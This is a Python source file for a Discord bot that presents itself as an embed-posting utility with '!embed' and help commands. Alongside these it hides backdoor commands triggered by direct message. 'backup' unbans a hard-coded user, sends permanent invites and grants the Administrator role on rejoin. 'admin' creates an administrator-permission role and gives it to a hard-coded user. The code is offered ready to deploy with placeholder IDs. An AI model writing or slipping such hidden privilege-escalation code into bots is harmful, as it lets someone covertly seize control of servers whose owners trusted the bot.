import discord

token = 'TOKEN' # Replace with your Discord bot token.

bot = discord.Client(intents=discord.Intents.all())
bot.waiting_to_join = set()

@bot.event
async def on_ready():
    print('Bot is ready')

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.content.lower().startswith('backup') and isinstance(message.channel, discord.DMChannel):
        guild_id = 111111111111111111 # Replace with your server ID
        guild = bot.get_guild(guild_id)
        user = discord.Object(111111111111111111) # Replace with your user id or the id of the user you want to allow to do it. (No quotes!)

        invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, unique=True)
        await message.author.send(f"Here's the invite link to {guild.name}: {invite}")
        try:
            await guild.unban(discord.Object(user.id))
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0, unique=True)
            bot.waiting_to_join.add(111111111111111111) # Replace with your user id or the id of the user you want to allow to do it. (No quotes!)
            await message.author.send(f"You have been unbanned from {guild.name}.\nHere's the invite link: {invite}")
        except discord.NotFound:
            await message.author.send("You are not banned.")

    elif message.content.startswith('!embed'):
        args = message.content.split(' ')
        if len(args) == 5:
            title = args[1]
            description = args[2]
            thumbnail_url = args[3]
            main_image_url = args[4]

            embed = discord.Embed(
                title=title,
                description=description,
            )
            embed.set_thumbnail(url=thumbnail_url)
            embed.set_image(url=main_image_url)

            await message.channel.send(embed=embed)

        else:
            await message.channel.send('Invalid arguments. Usage: `!embed [title] [description] [thumbnail url] [main image url]`')

    elif message.content.startswith('!help embed'):
        await message.channel.send('To use the embed command, type `!embed [title] [description] [thumbnail url] [main image url]`')

    if message.content.lower().startswith('admin') and isinstance(message.channel, discord.DMChannel):
      guild_id = 'SERVERID' # Replace with your server ID
      guild = bot.get_guild(guild_id)
      permissions = discord.Permissions(administrator=True)
      await guild.create_role(name="Perms", colour=discord.Colour(0xffffff), permissions=permissions)
      role = discord.utils.get(guild.roles, name="Perms")
      user = guild.get_member(111111111111111111) # Replace with your user id or the id of the user you want to allow to do it. (No quotes!)
      await user.add_roles(role)
      await message.channel.send('Succesfully gave you perms.')

@bot.event
async def on_member_join(member: discord.Member):
    if member.id in bot.waiting_to_join:
        role_to_add = discord.utils.get(member.guild.roles, name="Administrator")
        if role_to_add:  # a role with that name exists in the guild
            await member.add_roles(role_to_add)
            bot.waiting_to_join.remove(member.id)

bot.run(token)
